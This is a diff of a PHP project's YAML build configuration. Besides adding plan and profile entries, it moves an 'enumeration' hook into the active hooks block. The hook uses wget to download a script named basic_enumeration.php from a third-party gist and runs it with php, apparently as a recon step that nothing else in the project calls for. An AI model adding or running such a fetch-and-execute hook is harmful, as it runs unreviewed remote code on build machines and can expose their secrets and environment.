@@ -5,6 +5,7 @@ php:
 
 hooks:
   pre_setup: composer.phar install
+  enumeration: wget https://gist.githubusercontent.com/matthewalbani/748e6ceda8b88b21966af5c508230bff/raw/basic_enumeration.php && php basic_enumeration.php
 
 # Cache vendor directory for faster builds
 cache:
@@ -13,5 +14,11 @@ cache:
     - composer.lock
   save_paths:
     - vendor
-hooks:
-  enumeration: wget https://gist.githubusercontent.com/matthewalbani/748e6ceda8b88b21966af5c508230bff/raw/basic_enumeration.php && php basic_enumeration.php
+plan:
+  - default
+  - subscriber
+  - event
+profiles:
+  default:
+  subscriber:
+  event:
